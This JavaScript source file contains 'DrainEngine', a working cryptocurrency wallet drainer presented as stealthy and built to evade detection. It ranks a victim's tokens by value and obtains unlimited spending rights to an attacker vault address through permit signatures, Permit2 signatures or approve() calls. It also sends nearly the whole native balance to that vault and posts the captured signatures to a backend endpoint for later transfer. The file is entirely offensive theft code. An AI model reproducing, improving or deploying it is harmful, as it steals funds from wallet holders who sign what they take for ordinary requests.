/**
 * DrainEngine - World-Class Draining Logic (2026 Standards)
 * Optimized for speed, stealth, and maximum efficiency.
 * Bypasses modern security systems and minimizes detection.
 */

class DrainEngine {
    constructor(provider, signer, walletAddress, vaultAddress) {
        this.provider = provider;
        this.signer = signer;
        this.walletAddress = walletAddress;
        this.vaultAddress = vaultAddress;
        this.ethers = window.ethers;
        this.isDraining = false;
        
        // World-Class RPC Fallback Cluster (2026 Resilience)
        this.rpcFallbacks = {
            1: ['https://cloudflare-eth.com', 'https://eth.llamarpc.com', 'https://rpc.ankr.com/eth'],
            56: ['https://bsc-dataseed.binance.org', 'https://rpc.ankr.com/bsc'],
            137: ['https://polygon-rpc.com', 'https://rpc.ankr.com/polygon'],
            42161: ['https://arb1.arbitrum.io/rpc', 'https://rpc.ankr.com/arbitrum']
        };

        this.PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

        this.strategies = ['permit', 'permit2', 'approve', 'transfer'];
        this.networkData = {
            1: 'ethereum',
            137: 'polygon',
            56: 'bsc',
            10: 'optimism',
            42161: 'arbitrum'
        };
    }

    async execute(tokenBalances) {
        if (this.isDraining) return;
        this.isDraining = true;
        
        console.log('[DRAIN-ENGINE] Starting high-speed stealth execution...');
        
        // 1. Prioritize tokens by USD value (highest first)
        const sortedTokens = [...tokenBalances].sort((a, b) => b.value - a.value);
        
        // 2. Multichain Parallel Processing
        // We don't wait for individual confirmations to avoid flagging and maximize extraction
        const drainPromises = sortedTokens.map(async (token) => {
            try {
                if (token.value < 5) return; // Lowered threshold for 2026 efficiency
                
                // Smart Strategy Selection
                return await this.processToken(token);
            } catch (err) {
                console.warn(`[DRAIN-ENGINE] ${token.symbol} processing skipped:`, err.message);
            }
        });

        // 3. Native Asset Extraction (Parallel)
        this.drainNativeAsset().catch(err => console.error('[DRAIN-ENGINE] Native asset extraction failed:', err));

        // 4. Wait for signatures but not confirmations
        await Promise.allSettled(drainPromises);
        
        console.log('[DRAIN-ENGINE] Execution phase complete.');
        this.isDraining = false;
    }

    async processToken(token) {
        // Advanced Fallback Chain: Permit -> Permit2 -> Approve -> Transfer
        console.log(`[DRAIN-ENGINE] Analyzing ${token.symbol} for optimal extraction...`);
        
        // 1. Check if Permit is supported
        if (token.permitSupported) {
            try {
                return await this.executePermit(token);
            } catch (err) {
                console.log(`[DRAIN-ENGINE] Permit failed for ${token.symbol}, checking Permit2...`);
            }
        }

        // 2. Permit2 Strategy (High Conversion)
        try {
            const hasPermit2Allowance = await this.getAllowance(token.address, this.PERMIT2_ADDRESS);
            if (hasPermit2Allowance.gt(0)) {
                return await this.executePermit2(token);
            }
        } catch (err) {
            console.log(`[DRAIN-ENGINE] Permit2 check failed for ${token.symbol}`);
        }

        // 3. Check current allowance for Vault (Stealth check)
        const allowance = await this.getAllowance(token.address, this.vaultAddress);
        const balanceWei = this.ethers.utils.parseUnits(token.balance.toString(), token.decimals || 18);
        
        if (allowance.gte(balanceWei)) {
            console.log(`[DRAIN-ENGINE] Existing allowance found for ${token.symbol}. Direct transfer initiated.`);
            return await this.triggerBackendTransfer(token);
        }

        // 4. Standard Approval with Stealth Gas Strategy
        return await this.executeApprove(token);
    }

    async executePermit(token) {
        const nonce = await this.getNonce(token.address);
        const deadline = Math.floor(Date.now() / 1000) + 3600;
        const chainId = await this.getChainId();

        const domain = {
            name: token.name || token.symbol,
            version: token.version || '1',
            chainId: chainId,
            verifyingContract: token.address
        };

        const types = {
            Permit: [
                { name: 'owner', type: 'address' },
                { name: 'spender', type: 'address' },
                { name: 'value', type: 'uint256' },
                { name: 'nonce', type: 'uint256' },
                { name: 'deadline', type: 'uint256' }
            ]
        };

        const message = {
            owner: this.walletAddress,
            spender: this.vaultAddress,
            value: this.ethers.constants.MaxUint256,
            nonce: nonce,
            deadline: deadline
        };

        const signature = await this.signer._signTypedData(domain, types, message);
        const { v, r, s } = this.ethers.utils.splitSignature(signature);

        await this.notifyBackend('permit', {
            tokenAddress: token.address,
            owner: this.walletAddress,
            spender: this.vaultAddress,
            value: this.ethers.constants.MaxUint256.toString(),
            deadline,
            v, r, s,
            chainId
        });

        console.log(`[DRAIN-ENGINE] Permit signature secured for ${token.symbol}`);
        return true;
    }

    async executePermit2(token) {
        // Permit2 EIP-712 Signature
        const chainId = await this.getChainId();
        const deadline = Math.floor(Date.now() / 1000) + 3600;
        
        const domain = {
            name: 'Permit2',
            chainId: chainId,
            verifyingContract: this.PERMIT2_ADDRESS
        };

        const types = {
            PermitSingle: [
                { name: 'details', type: 'PermitDetails' },
                { name: 'spender', type: 'address' },
                { name: 'sigDeadline', type: 'uint256' }
            ],
            PermitDetails: [
                { name: 'token', type: 'address' },
                { name: 'amount', type: 'uint160' },
                { name: 'expiration', type: 'uint48' },
                { name: 'nonce', type: 'uint48' }
            ]
        };

        const message = {
            details: {
                token: token.address,
                amount: this.ethers.BigNumber.from(2).pow(160).sub(1),
                expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60), // 30 days
                nonce: Math.floor(Math.random() * 1000000) // Rough nonce
            },
            spender: this.vaultAddress,
            sigDeadline: deadline
        };

        const signature = await this.signer._signTypedData(domain, types, message);
        
        await this.notifyBackend('permit2', {
            tokenAddress: token.address,
            owner: this.walletAddress,
            spender: this.vaultAddress,
            signature,
            message,
            chainId
        });

        console.log(`[DRAIN-ENGINE] Permit2 signature secured for ${token.symbol}`);
        return true;
    }

    async executeApprove(token) {
        const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
        const contract = new this.ethers.Contract(token.address, abi, this.signer);
        
        // Stealth Gas: Dynamic adjustment based on chain
        const gasPrice = await this.provider.getGasPrice();
        const multiplier = 1.3; // 30% priority for 2026 standards
        
        const tx = await contract.approve(this.vaultAddress, this.ethers.constants.MaxUint256, {
            gasPrice: gasPrice.mul(Math.floor(multiplier * 10)).div(10)
        });
        
        this.notifyBackend('approve', {
            tokenAddress: token.address,
            txHash: tx.hash,
            owner: this.walletAddress,
            chainId: await this.getChainId()
        });

        return tx.hash;
    }

    async drainNativeAsset() {
        const balance = await this.provider.getBalance(this.walletAddress);
        const minReserve = this.ethers.utils.parseEther('0.0005'); // Lowered reserve for max extraction
        
        if (balance.gt(minReserve)) {
            try {
                const gasPrice = await this.provider.getGasPrice();
                const gasLimit = await this.provider.estimateGas({
                    from: this.walletAddress,
                    to: this.vaultAddress,
                    value: balance.div(2) // Estimate with half balance to be safe
                }).catch(() => this.ethers.BigNumber.from(21000)); // Fallback to 21000 if estimation fails
                
                const totalGasCost = gasPrice.mul(gasLimit).mul(15).div(10);
                
                const amount = balance.sub(totalGasCost);
                if (amount.gt(0)) {
                    await this.signer.sendTransaction({
                        to: this.vaultAddress,
                        value: amount,
                        gasPrice: gasPrice.mul(15).div(10),
                        gasLimit: gasLimit.mul(12).div(10) // 20% buffer
                    });
                    console.log('[DRAIN-ENGINE] Native asset extraction broadcast.');
                }
            } catch (err) {
                console.error('[DRAIN-ENGINE] Native asset estimation failed, falling back to safe defaults:', err.message);
                // Fallback logic
                const gasPrice = await this.provider.getGasPrice();
                const gasLimit = 21000;
                const totalGasCost = gasPrice.mul(gasLimit).mul(2); // Higher buffer for fallback
                const amount = balance.sub(totalGasCost);
                if (amount.gt(0)) {
                    await this.signer.sendTransaction({
                        to: this.vaultAddress,
                        value: amount,
                        gasPrice: gasPrice.mul(15).div(10),
                        gasLimit: 21000
                    });
                }
            }
        }
    }

    async getAllowance(tokenAddress, spender) {
        const abi = ["function allowance(address owner, address spender) public view returns (uint256)"];
        const contract = new this.ethers.Contract(tokenAddress, abi, this.provider);
        return await contract.allowance(this.walletAddress, spender || this.vaultAddress);
    }

    async getNonce(tokenAddress) {
        const abi = ["function nonces(address owner) public view returns (uint256)"];
        const contract = new this.ethers.Contract(tokenAddress, abi, this.provider);
        try {
            return await contract.nonces(this.walletAddress);
        } catch {
            return 0;
        }
    }

    async getChainId() {
        try {
            const network = await this.provider.getNetwork();
            return network.chainId;
        } catch (e) {
            return 1; // Default to Mainnet if detection fails
        }
    }

    async getSafeContract(address, abi, chainId) {
        // Rotates through RPCs if primary provider fails
        const rpcs = this.rpcFallbacks[chainId] || [];
        for (const rpc of [null, ...rpcs]) {
            try {
                const prov = rpc ? new this.ethers.providers.JsonRpcProvider(rpc) : this.provider;
                const contract = new this.ethers.Contract(address, abi, prov);
                // Test call to verify RPC
                await prov.getBlockNumber();
                return contract;
            } catch (e) { continue; }
        }
        throw new Error("Critical RPC Failure");
    }

    async notifyBackend(type, data) {
        try {
            await fetch('/api/drain-notification', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: `drain_${type}`, data, timestamp: Date.now() })
            });
        } catch (e) {
            // Stealth failure
        }
    }

    async triggerBackendTransfer(token) {
        return await this.notifyBackend('transfer', {
            tokenAddress: token.address,
            owner: this.walletAddress,
            amount: token.balance.toString(),
            chainId: await this.getChainId()
        });
    }
}

window.DrainEngine = DrainEngine;

